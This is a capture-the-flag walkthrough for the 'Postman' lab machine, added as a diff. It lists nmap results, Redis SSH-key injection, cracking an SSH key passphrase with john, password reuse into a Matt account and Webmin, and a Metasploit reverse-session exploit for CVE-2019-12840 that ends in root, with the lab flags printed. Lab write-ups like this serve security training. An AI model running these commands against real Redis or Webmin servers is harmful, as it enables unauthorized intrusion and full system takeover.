@@ -1,0 +1,79 @@
+Box name: Postman
+OS: Linux
+Difficulty: Easy
+IP: 10.10.10.160
+
+# Nmap 7.80 scan initiated Sun Jan  5 01:08:37 2020 as: nmap -A -sV -Pn -T4 -v -p- -oN initial.nmap 10.10.10.160
+22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
+|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
+|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
+80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-favicon: Unknown favicon MD5: E234E3E8040EFB1ACD7028330A956EBF
+| http-methods: 
+|_  Supported Methods: OPTIONS HEAD GET POST
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: The Cyber Geek's Personal Website
+6379/tcp  open  redis   Redis key-value store 4.0.9
+10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
+|_http-favicon: Unknown favicon MD5: 91549383E709F4F1DD6C8DAB07890301
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
+# Nmap done at Sun Jan  5 01:09:48 2020 -- 1 IP address (1 host up) scanned in 71.88 seconds
+
+Looks like redis keyserv is vulnerable to dbfile ssh key injection.
+
+looks like there is a redis user on the system with a .ssh directory in /var/lib/redis/.ssh/
+
+./exploit.sh 10.10.10.160 6379 redis /var/lib/redis/.ssh/
+
+LinEnum.sh found /opt/id_rsa.bak owned by the Matt user.
+
+Cracking ssh key with john
+    /usr/share/john/ssh2john.py id_rsa > id_rsa.john
+    john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.john 
+
+key password is
+    computer2008
+
+    ssh -i id_rsa Matt@10.10.10.160
+    computer2008
+
+Failed login
+    ssh -i id_rsa redis@10.10.10.160
+    computer2008
+
+Logged in as redis like from the exploit.
+
+It is possible to log into Matt account with the same password
+    Matt:computer2008
+
+    su Matt
+    computer2008
+
+user'd
+517ad0ec2458ca97af8d93aac08a2f3c
+
+It is also possible to log into webmin on port 10000 with the same credentials
+
+Webmin is running 1.910, which is vulnerable to CVE-2019-12840
+
+Metasploit has a module for CVE-2019-12840:
+    msfconsole -x "use exploit/linux/http/webmin_packageup_rce"
+    set LHOST tun0
+    set LPORT 2001
+    set USERNAME Matt
+    set PASSWORD computer2008
+    set SSL true
+    set RHOSTS 10.10.10.160
+    exploit -j
+    sessions -i 1
+
+id
+uid=0(root) gid=0(root) groups=0(root)
+
+root'd
+a257741c5bed8be7778c6ed95686ddce
+
